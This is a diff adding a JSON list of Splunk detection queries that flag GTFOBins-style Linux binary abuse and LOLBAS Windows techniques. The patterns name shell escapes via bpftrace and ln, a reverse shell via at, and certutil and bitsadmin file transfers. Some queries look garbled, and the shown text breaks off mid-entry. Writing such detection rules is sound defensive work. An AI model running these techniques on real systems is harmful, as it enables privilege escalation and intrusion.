@@ -1,0 +1,3322 @@
+[
+    {
+        "name": "(Linux) aa-exec",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (aa-exec /bin/sh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ab",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ab)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) agetty",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (./agetty -o -p -l -a root tty)",
+        "sevirity": 4
+    },
+    {
+        "name": "All logs from the App",
+        "query": "index=_* sourcetype=\"tarecordedfuture:app:log\"",
+        "sevirity": 3
+    },
+    {
+        "name": "All web requests",
+        "query": "curl OR wget OR Invoke-WebRequest",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) alpine",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (alpine -F)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ansible-playbook",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ansible-playbook)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ansible-test",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ansible-test shell)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) aoss",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (aoss)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) apache2ctl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*apache2ctl Include)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) apt",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (apt changelog)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) apt-get",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (apt-get changelog */bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ar",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ar r cat)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) aria2c",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (aria2c -o)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) arj",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (arj a)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) arp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (arp -v -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) as",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (as @)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ascii-xfr",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ascii-xfr -ns)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ascii85",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo ascii85 --decode)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ash",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"ash\" OR comm=\"*/ash\" OR comm=\"* ash\" OR comm=\"* */ash\" OR \"ash -c\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) aspell",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (aspell -c)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) at",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (echo at)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) atobm",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (atobm awk -F printf)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) awk",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (awk)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) base58",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*base58 --decode)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) basenc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (basenc --base64)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) basez",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (basez --decode)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) batcat",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (batcat --paging)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) bc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (bc -s quit)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) bconsole",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (bconsole)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) bpftrace",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'*echo 'BEGIN {system(\"/bin/sh\");exit()}' >*sudo bpftrace *sudo bpftrace -c /bin/sh -e 'END {exit()}')",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) bridge",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (bridge -b)",
+        "sevirity": 4
+    },
+    {
+        "name": "Bucket Merge Retrieve Conf Settings",
+        "query": "| rest services/data/indexes datatype=all \n| search disabled!=1 AND bucketMerging=1 \n| dedup title \n| fields title bucketMerging bucketMerge.minMergeSizeMB bucketMerge.maxMergeSizeMB bucketMerge.maxMergeTimeSpanSecs bucketMerge.minMergeCount bucketMerge.maxMergeCount",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) bundle",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=*bundle*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) bundler",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (bundler help*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) busctl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (busctl)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) busybox",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"busybox *\" OR comm=\"*/busybox *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) byebug",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (byebug)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) bzip2",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (bzip2 -c -d)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) c89",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (c89)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) c99",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (c99)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cabal",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (cabal exec)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cancel",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (cancel -u -h)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) capsh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (capsh --)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cdist",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (cdist shell -)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) certbot",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*certbot certonly)",
+        "sevirity": 4
+    },
+    {
+        "name": "check privileges sudo -l",
+        "query": "sudo -l",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) check_by_ssh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (check_by_ssh -o \"*\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) check_log",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (check_log -F -O)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) check_ssl_cert",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (echo tee chmod *cert --curl-bin)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) check_statusfile",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (check_statusfile)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) choom",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (choom)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) chown",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (chown -un -gn)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) chroot",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (chroot)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) clamscan",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (touch clamscan --no-summary -d -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "CMDKEY",
+        "query": "Process_Name=\"*cmdkey*\"",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) cmp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (cmp /dev/zero -b -l)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cobc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*/bin/* cobc)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) column",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (column)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) comm",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm /dev/null 2>/dev/null)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) Command /bin/sh was executed",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=/bin/sh)",
+        "sevirity": 4
+    },
+    {
+        "name": "Command was executed (findstr)",
+        "query": "sourcetype=\"Wineventlog:*\" AND findstr",
+        "sevirity": 2
+    },
+    {
+        "name": "compiling by gcc",
+        "query": "comm=\"gcc\"",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cowsay",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (/bin/* cowsay)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cowthink",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (/bin/* cowthink)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cpan",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (cpan)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cpio",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"cpio *\" OR comm=\"* cpio\" OR comm=\"* cpio *\" OR comm=\"*/cpio *\" OR comm=\"* */cpio *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cpulimit",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (cpulimit -l -f /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) crash",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (crash -h)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) crontab",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"crontab *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) csh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=csh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) csplit",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*csplit 1cat)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) csvtool",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (csvtool)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cupsfilter",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (cupsfilter -i -m)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) cut",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (cut -d -f1)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dash",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=dash)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) date",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (date -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (dc -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dialog",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*dialog --textbox)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) diff",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (diff --recursive)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dmesg",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (dmesg */bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dmidecode",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*sudo dmidecode --no-sysfs -d  --dump-bin)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dmsetup",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo dmsetup create base --exec)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dos2unix",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (dos2unix -f -n)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dosbox",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (dosbox -c)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dotnet",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"*dotnet *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dpkg",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (dpkg *)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) dvips",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (dvips)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) easy_install",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (easy_install)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) eb",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (eb logs)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ed",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=ed)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) efax",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (efax -d)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) elvish",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (elvish)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) emacs",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (emacs)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) enscript",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (enscript)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) env",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"env *\" OR comm=\"* env *\" OR comm=\"*/env *\" OR comm=\"* */env *\" OR *.env OR comm=\"* *.env\" OR comm=\"* *.env *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) eqn",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (eqn)",
+        "sevirity": 4
+    },
+    {
+        "name": "Errors in the last 24 hours",
+        "query": "error OR failed OR severe OR ( sourcetype=access_* ( 404 OR 500 OR 503 ) )",
+        "sevirity": 3
+    },
+    {
+        "name": "Errors in the last hour",
+        "query": "error OR failed OR severe OR ( sourcetype=access_* ( 404 OR 500 OR 503 ) )",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) espeak",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (espeak -qXf)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=ex *)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) exiftool",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (exiftool)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) expand",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (expand)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) expect",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (expect -c)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) facter",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (necho '*')",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) file",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (file -f-m)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) find",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND ((find .) OR (find /))",
+        "sevirity": 4
+    },
+    {
+        "name": "find ssh",
+        "query": "find / -type f -name \"*ssh*\"",
+        "sevirity": 4
+    },
+    {
+        "name": "finds all files on the system with the SUID",
+        "query": "find -perm",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) finger",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (finger)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) fish",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (fish)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) flock",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (flock /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) fmt",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (fmt)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) fold",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*fold -w99999999)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) fping",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (fping -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) gcloud",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (gcloud)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) gcore",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (gcore)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) gem",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (gem open -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) genie",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (genie -c)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) genisoimage",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (genisoimage -q -o)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ghc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ghc -e *bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ghci",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ghciSystem.Process.callCommand /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ginsh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ginsh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) git",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (git)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) grc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (grc --pty /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "grep password and ssh",
+        "query": "grep -rn (\"password\" OR \"ssh\") /",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) gtester",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (gtester)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) hd",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (hd)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) head",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (head -c1G)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) hexdump",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (hexdump -C)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) highlight",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (highlight --no-doc --failsafe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) hping3",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (hping3)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) iconv",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (iconv -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "id and uname",
+        "query": "comm=id OR comm=\"*uname*\"",
+        "sevirity": 1
+    },
+    {
+        "name": "(Linux) install",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (install -m 6777)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ionice",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ionice /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ip",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ip -force -batch)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ispell",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ispell)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) joe",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"joe *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) join",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*join -a)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) jq",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (jq -Rr)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) jrunscript",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (jrunscript -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) jtag",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (jtag --interactive\nshell)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) julia",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (julia -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) knife",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (knife exec)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ksh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ksh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ksshell",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ksshell -i)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ksu",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo ksu -q -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "Latest Updates of All Risk Lists",
+        "query": "| inputlookup checkpoints | eval Time=strftime(updated,\"%a %b %d, %Y at %I:%M:%S:%p\") | eval split_history=split(history,\",\") | eval time_history=strftime(split_history,\"%a %b %d, %Y at %I:%M:%S:%p\") | where isnotnull(time_history) | rename name TO \"Risklist name\" | rename Time TO \"Last updated\" | rename time_history TO \"Last 5 updates\" | fields \"Risklist name\", \"Last updated\", \"Last 5 updates\"",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) latex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (latex --shell-escape)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) latexmk",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (latexmk -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) lftp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (lftp -c)",
+        "sevirity": 4
+    },
+    {
+        "name": "License Usage Data Cube",
+        "query": "index=_internal source=*license_usage.log* type=\"Usage\" | eval h=if(len(h)=0 OR isnull(h),\"(SQUASHED)\",h) | eval s=if(len(s)=0 OR isnull(s),\"(SQUASHED)\",s) | eval idx=if(len(idx)=0 OR isnull(idx),\"(UNKNOWN)\",idx) | bin _time span=1d | stats sum(b) as b by _time, pool, s, st, h, idx",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) ln",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo ln -fs /bin/sh /bin/lnsudo ln)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) loginctl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (loginctl user-status*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) logsave",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (\"logsave /dev/null\")",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS  T1036.005: Match Legitimate Name or Location",
+        "query": "colorcpl",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS  T1127: Trusted Developer Utilities Proxy Execution",
+        "query": "aspnet_compiler none",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS  T1202: Indirect Command Execution",
+        "query": "source=\"win*\" AND \"bash.exe -c\"",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS  T1218.002: Control Panel",
+        "query": "control.exe",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS  T1218: System Binary Proxy Execution",
+        "query": "AddinUtil AddinRoot",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS  T1218: System Binary Proxy Execution - 2",
+        "query": "ATBroker /start",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS certutil",
+        "query": "certutil.exe AND (\"urlcache\" OR \"verifyctl\" OR \"urlcache\" OR \"encode\" OR \"decode\" OR \"decodehex\")",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1053.002: At",
+        "query": "at /interactive revshell",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1105: Ingress Tool Transfer",
+        "query": "start ms-appinstaller",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1105: Ingress Tool Transfer - 2",
+        "query": "CertReq -Post -config",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1105: Ingress Tool Transfer -2",
+        "query": "cmdl32 /vpn",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1105: Ingress Tool Transfer/T1218: System Binary Proxy Execution",
+        "query": "bitsadmin /create /addfile",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1127: Trusted Developer Utilities Proxy Execution",
+        "query": "csc.exe",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1218.003: CMSTP",
+        "query": "cmstp.exe /ni /s",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1218: System Binary Proxy Execution",
+        "query": "CustomShellHost.exe",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1218: System Binary Proxy Execution/ T1105: Ingress Tool Transfer",
+        "query": "certoc.exe AND (\"LoadDLL\" OR \"GetCACAPS\")",
+        "sevirity": 4
+    },
+    {
+        "name": "LOLBAS T1567: Exfiltration Over Web Service",
+        "query": "ConfigSecurityPolicy.exe",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) look",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (look)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) lp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (lp -h)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ltrace",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ltrace)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) lua",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=*lua* AND /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) lualatex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (lualatex -shell-escape '*')",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) luatex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (luatex -shell-escape)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) lwp-download",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (lwp-download)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) mawk",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (mawk)",
+        "sevirity": 4
+    },
+    {
+        "name": "Messages by minute last 3 hours",
+        "query": "index=_internal source=\"*metrics.log\" eps \"group=per_source_thruput\" NOT filetracker | eval events=eps*kb/kbps | timechart fixedrange=t span=1m limit=5 sum(events) by series",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) minicom",
